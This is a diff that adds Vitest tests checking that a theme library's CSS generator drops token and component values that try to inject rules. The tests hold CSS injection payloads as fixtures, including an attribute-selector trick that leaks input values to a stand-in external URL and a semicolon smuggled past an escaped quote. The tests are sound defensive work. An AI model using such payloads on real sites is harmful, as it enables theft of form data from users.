@@ -6,7 +6,7 @@
  * for both runtime and build paths.
  */
 
-import {describe, it, expect} from 'vitest';
+import {describe, it, expect, vi} from 'vitest';
 import {
   dataTokenDefaults,
   defineTheme,
@@ -798,5 +798,160 @@ describe('data visualization tokens', () => {
     expect(
       Object.keys(generateThemeCSS(defineTheme({name: 'data-shape'}))).sort(),
     ).toEqual(['component', 'prose']);
+  });
+});
+
+describe('declaration assembly keeps values as values', () => {
+  it('passes every ordinary token value through byte-identically', () => {
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        '--color-accent': 'color-mix(in oklch, #FF00FF 80%, white)',
+        '--color-background-surface':
+          'linear-gradient(135deg, #FF00FF 0%, #00FFFF 100%)',
+        '--size-element-md': 'calc(100% - 24px)',
+        '--font-family-body': "'Inter Var', ui-sans-serif, system-ui",
+        '--color-text-primary': 'light-dark(#fff, #111)',
+      },
+    });
+    const {component} = generateThemeCSS(theme);
+    expect(component).toContain(
+      '--color-accent: color-mix(in oklch, #FF00FF 80%, white);',
+    );
+    expect(component).toContain(
+      '--color-background-surface: linear-gradient(135deg, #FF00FF 0%, #00FFFF 100%);',
+    );
+    expect(component).toContain('--size-element-md: calc(100% - 24px);');
+    expect(component).toContain(
+      "--font-family-body: 'Inter Var', ui-sans-serif, system-ui;",
+    );
+    expect(component).toContain(
+      '--color-text-primary: light-dark(#fff, #111);',
+    );
+  });
+
+  it('drops a token value that tries to close its rule', () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        '--color-accent':
+          'red } input[value^="a"] { background: url(https://example.com/leak?a) ',
+      },
+    });
+    const {component} = generateThemeCSS(theme);
+    expect(component).not.toContain('input[value');
+    expect(component).not.toContain('leak');
+    expect(warn).toHaveBeenCalledWith(
+      expect.stringContaining('--color-accent'),
+    );
+    warn.mockRestore();
+  });
+
+  it('drops a component override value that tries to add a declaration', () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const theme = defineTheme({
+      name: 'brand',
+      components: {
+        button: {
+          'variant:secondary': {
+            backgroundColor:
+              'red; background-image: url(https://example.com/x)',
+          },
+        },
+      },
+    });
+    const {component} = generateThemeCSS(theme);
+    expect(component).not.toContain('background-image');
+    expect(component).not.toContain('example.com');
+    warn.mockRestore();
+  });
+
+  it('keeps prose rules intact when a typed token carries a payload', () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    // The prose block interpolates type-scale tokens inline (via val), so an
+    // unsafe value falls back to the var() reference — which the token block
+    // dropped — instead of closing the :where(p) rule early.
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        '--text-body-size': '1rem; } body { background: url(x) ',
+      },
+    });
+    const {component, prose} = generateThemeCSS(theme);
+    const css = component + prose;
+    expect(css).not.toContain('background: url(x)');
+    expect(css).not.toContain('body {');
+    expect(prose).toContain('font-size: var(--text-body-size);');
+    expect(warn).toHaveBeenCalledWith(
+      expect.stringContaining('--text-body-size'),
+    );
+    warn.mockRestore();
+  });
+
+  it('a data: URI value passes — its semicolons live inside url()', () => {
+    const theme = defineTheme({
+      name: 'brand',
+      components: {
+        button: {
+          'variant:secondary': {
+            backgroundImage:
+              'url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==)',
+          },
+        },
+      },
+    });
+    const {component} = generateThemeCSS(theme);
+    expect(component).toContain(
+      'background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==);',
+    );
+  });
+
+  it('an escaped quote cannot smuggle a live semicolon past the guard', () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        // To CSS the leading \" is an escaped quote CHARACTER, not a string
+        // opener, so the semicolon after it is live and terminates the
+        // declaration. Pairing the quotes as a string would blank the span
+        // and let the injection through as "quoted".
+        '--color-accent': '\\"; background: url(https://example.com/leak); "',
+      },
+    });
+    const {component} = generateThemeCSS(theme);
+    expect(component).not.toContain('example.com');
+    expect(warn).toHaveBeenCalledWith(
+      expect.stringContaining('--color-accent'),
+    );
+    warn.mockRestore();
+  });
+
+  it('an escaped quote inside a string stays inside it', () => {
+    // `"a\" ; b"` is one string to CSS — its semicolon is inert. Closing the
+    // string at the escaped quote would expose that semicolon and reject a
+    // value that never leaves its declaration.
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        '--color-accent': '"a\\" ; b"',
+      },
+    });
+    const {component} = generateThemeCSS(theme);
+    expect(component).toContain('--color-accent: "a\\" ; b";');
+  });
+
+  it('drops a property name that is not a property name', () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        '--x:red} body{color:blue': 'red',
+      } as Record<string, string>,
+    });
+    const {component} = generateThemeCSS(theme);
+    expect(component).not.toContain('body{color:blue');
+    expect(component).not.toContain('body {');
+    warn.mockRestore();
   });
 });
